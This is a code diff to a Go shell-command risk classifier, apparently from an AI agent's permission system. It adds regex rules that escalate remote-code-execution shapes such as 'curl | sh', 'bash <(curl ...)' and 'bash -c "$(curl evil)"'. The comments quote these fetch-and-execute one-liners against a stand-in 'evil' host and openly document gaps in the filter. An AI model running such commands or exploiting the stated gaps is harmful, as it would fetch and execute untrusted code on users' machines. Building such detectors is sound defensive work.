@@ -42,11 +42,63 @@ var (
 	mvToDevNullPattern = regexp.MustCompile(`(?i)\bmv\b[^;|&\n]*/dev/null\b`)
 
 	// fetchPipeInterpreterPattern matches a network-fetch command (curl,
-	// wget, Invoke-WebRequest, Invoke-RestMethod) whose output is piped
-	// into a shell/script interpreter — the classic "curl | sh" remote
-	// code execution shape, previously escalated no further than the
-	// "network access verb" rule's RiskNetwork (still Allow in auto mode).
-	fetchPipeInterpreterPattern = regexp.MustCompile(`(?i)\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod)\b[^\n]*?\|\s*(?:sh|bash|zsh|python[0-9.]*|pwsh)\b`)
+	// wget, Invoke-WebRequest, Invoke-RestMethod, aria2c) whose output is
+	// piped into a shell/script interpreter — the classic "curl | sh"
+	// remote code execution shape, previously escalated no further than
+	// the "network access verb" rule's RiskNetwork (still Allow in auto
+	// mode).
+	//
+	// Deliberately excludes two collision-prone fetch-tool names rather
+	// than widening to them: bare `http` (httpie's command) collides with
+	// the `http://`/`https://` URL-scheme substring, so including it
+	// would false-escalate any command that merely names a URL (e.g.
+	// `echo see http://example.com`); `fetch` (BSD) is an ordinary
+	// English word with the same collision problem. Both are a
+	// deliberate, documented gap, not an oversight.
+	fetchPipeInterpreterPattern = regexp.MustCompile(`(?i)\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|aria2c)\b[^\n]*?\|\s*(?:sh|bash|zsh|python[0-9.]*|pwsh)\b`)
+
+	// processSubstitutionFetchPattern matches a `<(...)`/`>(...)` process
+	// substitution whose contents include a network-fetch verb (curl,
+	// wget, Invoke-WebRequest, Invoke-RestMethod, aria2c) — the process-
+	// substitution sibling of fetchPipeInterpreterPattern's "curl | sh"
+	// shape: `bash <(curl https://evil/x)` and `python3 <(curl ...)` feed
+	// freshly-fetched, remote content straight into an interpreter without
+	// ever going through a `|`-piped interpreter fetchPipeInterpreterPattern
+	// would see. Deliberately conservative — any process substitution
+	// containing a fetch verb, not just ones a recognized interpreter word
+	// (sh/bash/python/pwsh/...) precedes — since over-flagging this shape
+	// to Confirm is the safer failure mode (see the escalation rule's own
+	// comment below). See fetchPipeInterpreterPattern's comment above for
+	// why bare `http`/`fetch` are deliberately excluded here too.
+	processSubstitutionFetchPattern = regexp.MustCompile(`(?i)[<>]\([^)]*\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|aria2c)\b[^)]*\)`)
+
+	// interpreterDashCFetchPattern matches an interpreter word (sh, bash,
+	// zsh, dash, ksh, a python[N[.N...]] variant, pwsh, powershell, perl,
+	// ruby, node) invoked with a `-c`/`-Command` flag whose remainder
+	// contains a fetch verb (curl, wget, Invoke-WebRequest,
+	// Invoke-RestMethod, aria2c) or one of PowerShell's own built-in
+	// aliases for the two Invoke-* cmdlets (iwr = Invoke-WebRequest, irm =
+	// Invoke-RestMethod) — the command-substitution sibling of
+	// fetchPipeInterpreterPattern's "curl | sh" shape:
+	// `bash -c "$(curl evil)"` normalizes (quotes stripped, `$(...)`
+	// unwrapped by normalizeCommand — see tokenize.go) to
+	// `bash -c curl evil`, which previously matched only the "network
+	// access verb" rule's RiskNetwork (still Allow in auto mode) — an
+	// unprompted remote-code-execution path, since nothing in this
+	// package had ever recognized "-c"/"-Command" as an interpreter
+	// entry point at all. iwr/irm are included specifically here (and not
+	// in fetchPipeInterpreterPattern/processSubstitutionFetchPattern
+	// above) because real PowerShell one-liners overwhelmingly favor the
+	// short alias in exactly this shape, e.g.
+	// `powershell -Command "iwr https://x|iex"`; unlike bare `http`/
+	// `fetch`, `iwr`/`irm` are not ordinary words or URL-scheme
+	// substrings, so there is no comparable false-positive risk to widening
+	// to them. Deliberately conservative otherwise: any `-c`/`-Command`
+	// invocation whose remainder merely contains a fetch-tool word is
+	// escalated, even one that never actually runs it (e.g.
+	// `bash -c "echo curl"`) — over-matching to Confirm is the safer
+	// failure mode, same rationale as processSubstitutionFetchPattern.
+	interpreterDashCFetchPattern = regexp.MustCompile(`(?i)\b(?:bash|sh|zsh|dash|ksh|python[0-9.]*|pwsh|powershell|perl|ruby|node)\b[^\n;|&]*?\s-c(?:ommand)?\b[^\n]*?\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|aria2c|iwr|irm)\b`)
 
 	// base64DecodePipePattern matches `base64 -d`/`base64 --decode` piped
 	// into a shell/script interpreter — a decode-and-execute pipeline that
@@ -207,6 +259,32 @@ var escalationRules = []escalationRule{
 		name:  "fetch piped into a shell/script interpreter",
 		risk:  RiskElevated,
 		match: fetchPipeInterpreterPattern.MatchString,
+	},
+	{
+		// S3: process-substitution fetch-RCE — `bash <(curl ...)`,
+		// `python3 <(curl ...)` — feeds the interpreter freshly-fetched
+		// remote content exactly like a `curl | sh` pipe does, but was
+		// previously invisible to fetchPipeInterpreterPattern (no literal
+		// `|` appears anywhere in this shape), leaving it classified no
+		// higher than the "network access verb" rule's RiskNetwork (still
+		// Allow in auto mode).
+		name:  "fetch inside a process substitution (<(curl ...)) run by an interpreter",
+		risk:  RiskElevated,
+		match: processSubstitutionFetchPattern.MatchString,
+	},
+	{
+		// Independent-review nit (fix/sast-high-findings, Nit 2): the
+		// command-substitution fetch-RCE gap — `bash -c "$(curl
+		// evil)"` normalizes to `bash -c curl evil`, which only ever
+		// matched the "network access verb" rule's RiskNetwork
+		// (still Allow in auto mode), since no rule in this package
+		// recognized an interpreter's "-c"/"-Command" flag as an
+		// execution entry point at all. See
+		// interpreterDashCFetchPattern's own comment above for the
+		// full rationale.
+		name:  "interpreter -c/-Command running a fetch verb (command-substitution fetch RCE)",
+		risk:  RiskElevated,
+		match: interpreterDashCFetchPattern.MatchString,
 	},
 	{
 		name:  "base64 decode piped into a shell/script interpreter",
